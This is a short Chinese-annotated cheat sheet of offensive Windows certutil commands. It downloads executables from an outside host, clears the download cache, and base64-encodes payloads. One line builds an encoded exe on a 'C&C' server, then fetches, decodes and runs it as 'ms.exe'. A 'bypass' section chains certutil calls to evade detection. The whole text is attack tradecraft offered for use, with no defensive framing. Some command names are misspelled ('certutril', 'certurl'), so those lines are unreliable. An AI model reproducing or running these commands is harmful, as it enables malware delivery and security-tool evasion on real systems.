	>certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe 
	>certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe  1.exe
	删除缓存
	>certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe delete
	查看缓存
	>certutil.exe -urlcache *
	转为base64
	>certutil -encode lcx64.exe lcx64.txt 或>certutil -encode d:\lcx64.exe d:\lcx64.txt(本地执行)
	>echo xxxx>>d:\1.txt
	解码
	>certutil -decode 1.txt lcx64.exe
	对文件进行编码下载后解码执行
	>base64 payload.exe > /var/www/html/1.txt # 在C&C上生成经base64编码的exe
	>certutril -urlcache -split -f http://192.168.0.107/1.txt & certurl -decode 1.txt ms.exe & ms.exe
	bypass
	>Certutil & Certutil –urlcache –f –split url
	>Certutil | Certutil –urlcache –f –split url